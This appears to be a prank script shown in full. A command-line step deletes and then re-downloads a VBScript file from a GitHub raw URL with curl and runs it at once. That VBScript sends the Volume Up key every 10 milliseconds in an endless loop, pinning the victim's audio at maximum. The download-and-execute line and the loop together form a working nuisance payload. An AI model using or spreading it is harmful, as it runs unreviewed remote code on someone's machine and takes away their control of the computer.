del .\well.vbs
curl -o "well.vbs" "https://raw.githubusercontent.com/BastelPichi/wellerman/main/well.vbs" && start .\well.vbs

do
Set WshShell = CreateObject("WScript.Shell")
WshShell.SendKeys(chr(&hAF))
WScript.Sleep 10
loop
